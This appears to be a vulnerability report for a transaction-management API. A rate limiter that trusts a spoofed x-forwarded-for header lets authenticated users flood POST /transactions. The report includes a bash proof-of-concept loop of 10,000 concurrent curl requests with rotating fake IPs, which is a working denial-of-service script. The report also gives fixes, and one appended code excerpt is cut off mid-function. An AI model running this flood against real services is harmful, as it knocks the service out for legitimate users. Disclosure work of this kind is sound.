### Title
Authenticated Users Can Bypass IP-Based Rate Limiting via `x-forwarded-for` Header Spoofing to Flood the Transaction Creation Endpoint

### Summary
The global rate limiter tracks clients by the raw `x-forwarded-for` request header without validating it against a trusted proxy. Any authenticated user can rotate this header value on each request to obtain a fresh rate-limit bucket, bypassing the only per-IP throttle protecting the `POST /transactions` endpoint. No per-user transaction count limit exists, so an attacker can create an unbounded number of database records, exhausting PostgreSQL storage and connection capacity and degrading service for all legitimate users.

### Finding Description

**Root cause — `IpThrottlerGuard` trusts a user-controlled header**

The guard that is registered as the single global `APP_GUARD` for the entire API service reads the client identifier directly from the `x-forwarded-for` header:

```ts
// back-end/apps/api/src/guards/ip-throttler.guard.ts
protected getTracker(req: Record<string, any>): Promise<string> {
  const clientIp = req.headers['x-forwarded-for'] || req.ip;
  ...
  return clientIp;
}
``` [1](#0-0) 

This guard is wired as the sole global throttle in `api.module.ts`:

```ts
providers: [
  { provide: APP_GUARD, useClass: IpThrottlerGuard },
  ...
]
``` [2](#0-1) 

The `IpThrottlerModule` configures two buckets (`global-minute` and `global-second`) whose limits come from environment variables: [3](#0-2) 

Because the tracker key is the raw header string, an attacker who sends `x-forwarded-for: <arbitrary-rotating-value>` on every request gets a brand-new, empty bucket each time, making the rate limit completely ineffective.

**No per-user throttle is applied to the transactions controller**

`UserThrottlerModule` and `UserThrottlerGuard` exist in the codebase: [4](#0-3) [5](#0-4) 

However, `UserThrottlerModule` is **not** imported in `api.module.ts`, and `UserThrottlerGuard` is **not** applied to `TransactionsController` either globally or at the route level. The controller's guard chain is only:

```ts
@UseGuards(JwtBlackListAuthGuard, JwtAuthGuard, VerifiedUserGuard)
export class TransactionsController { ... }
``` [6](#0-5) 

**Each `POST /transactions` call is expensive**

`createTransaction` → `createTransactions` performs:
1. A mirror-network client connection
2. Cryptographic signature verification
3. A PostgreSQL `find` (duplicate check) + `save` (insert)
4. A scheduler reminder registration
5. A NATS notification emission [7](#0-6) 

There is no cap on how many active (non-terminal) transactions a single user may hold.

**Exploit flow**

1. Attacker registers a normal user account and uploads one key (satisfying `HasKeyGuard`).
2. Attacker obtains a valid JWT.
3. Attacker sends `POST /transactions` in a tight loop, rotating the `x-forwarded-for` header on every request (e.g., `1.0.0.1`, `1.0.0.2`, …).
4. Each request passes the global IP throttle because each header value maps to a fresh bucket.
5. The database accumulates rows without bound; the PostgreSQL connection pool saturates; NATS is flooded with status-update events.
6. Legitimate users receive timeouts or errors on all transaction-related endpoints.

### Impact Explanation
An authenticated attacker with a single registered key can exhaust PostgreSQL disk space and connection pool capacity, and flood the NATS message bus, causing a full service outage for all other users of the organizational transaction workflow. Recovery requires manual database cleanup and service restart.

### Likelihood Explanation
The precondition is a valid, verified user account with at least one registered key — the normal onboarding state for any legitimate user of the tool. The bypass technique (rotating the `x-forwarded-for` header) requires no special tooling; a simple `curl` loop or any HTTP client that sets custom headers is sufficient. No privileged access, leaked credentials, or cryptographic breaks are needed.

### Recommendation
1. **Do not trust `x-forwarded-for` unconditionally.** Configure the application to accept the header only from known trusted proxy CIDR ranges (e.g., via NestJS `app.set('trust proxy', ...)` or an explicit allowlist), or use `req.ip` exclusively when the deployment topology guarantees the proxy sets it correctly.
2. **Apply `UserThrottlerGuard` to the transactions controller** (or register it as a second global guard) so that rate limiting is keyed on the authenticated user identity, which cannot be spoofed.
3. **Enforce a per-user cap on active (non-terminal) transactions** inside `createTransaction`, rejecting new submissions once a configurable ceiling is reached.

### Proof of Concept

```bash
JWT="<valid_jwt_for_registered_user>"
TX_BYTES="<valid_base64_transaction_bytes>"
SIG="<valid_signature>"
KEY_ID=1
NETWORK="mainnet"

for i in $(seq 1 10000); do
  curl -s -o /dev/null -X POST https://<api-host>/transactions \
    -H "Authorization: Bearer $JWT" \
    -H "x-forwarded-for: 10.0.$((i / 256)).$((i % 256))" \
    -H "Content-Type: application/json" \
    -d "{\"transactionBytes\":\"$TX_BYTES\",\"signature\":\"$SIG\",\"creatorKeyId\":$KEY_ID,\"mirrorNetwork\":\"$NETWORK\",\"name\":\"flood-$i\",\"isManual\":false}" &
done
wait
```

Each iteration presents a unique IP to the throttler. The loop saturates the PostgreSQL `transaction` table and NATS event bus, rendering the service unavailable to legitimate users. The `x-forwarded-for` value is read directly from the header at: [8](#0-7) 

with no proxy-trust validation anywhere in the application bootstrap: [9](#0-8)

@Injectable()
export class UserThrottlerGuard extends ThrottlerGuard {
  protected getTracker(req: Record<string, any>): Promise<string> {
    const user = req.user;
    if (!user) {
      throw new HttpException('No user connected.', HttpStatus.BAD_REQUEST);
    }
    // console.log('user id', user.id);

  async createTransactions(dtos: CreateTransactionDto[], user: User): Promise<Transaction[]> {
    if (dtos.length === 0) return [];

    await attachKeys(user, this.entityManager);

    const client = await getClientFromNetwork(dtos[0].mirrorNetwork);

    try {
      // Validate all DTOs upfront
      const validatedData = await Promise.all(
        dtos.map(dto => this.validateAndPrepareTransaction(dto, user, client)),
      );

      // Batch check for existing transactions
      const transactionIds = validatedData.map(v => v.transactionId);
      const existing = await this.repo.find({
        where: {
          transactionId: In(transactionIds),
          status: Not(
            In([
              TransactionStatus.CANCELED,
              TransactionStatus.REJECTED,
              TransactionStatus.ARCHIVED,
            ]),
          ),
        },
        select: ['transactionId'],
      });

      if (existing.length > 0) {
        throw new BadRequestException(
          `Transactions already exist: ${existing.map(t => t.transactionId).join(', ')}`,
        );
      }

      // Wrap database operations in transaction
      const savedTransactions = await this.entityManager.transaction(async (entityManager) => {
        const transactions = validatedData.map(data =>
          this.repo.create({
            name: data.name,
            type: data.type,
            description: data.description,
            transactionId: data.transactionId,
            transactionHash: data.transactionHash,
            transactionBytes: data.transactionBytes,
            unsignedTransactionBytes: data.unsignedTransactionBytes,
            status: TransactionStatus.WAITING_FOR_SIGNATURES,
            creatorKey: { id: data.creatorKeyId },
            signature: data.signature,
            mirrorNetwork: data.mirrorNetwork,
            validStart: data.validStart,
            isManual: data.isManual,
            cutoffAt: data.cutoffAt,
            publicKeys: data.publicKeys,
          }),
        );

        try {
          return await entityManager.save(Transaction, transactions);
        } catch (error) {
          throw new BadRequestException(ErrorCodes.FST);
        }
      });

      // Batch schedule reminders
      const reminderPromises = savedTransactions
        .map((tx, index) => {
          const dto = dtos[index];
          if (!dto.reminderMillisecondsBefore) return null;

          const remindAt = new Date(tx.validStart.getTime() - dto.reminderMillisecondsBefore);
          return this.schedulerService.addReminder(
            getTransactionSignReminderKey(tx.id),
            remindAt,
          );
        })
        .filter(Boolean);

      await Promise.all(reminderPromises);

      return savedTransactions;
    } catch (err) {
      // Preserve explicit BadRequestException, but annotate unexpected errors
      if (err instanceof BadRequestException) throw err;

      const PREFIX = 'An unexpected error occurred while creating transactions';
      const message = err instanceof Error && err.message ? `${PREFIX}: ${err.message}` : PREFIX;
      throw new BadRequestException(message);
    } finally {
      client.close();
    }
  }
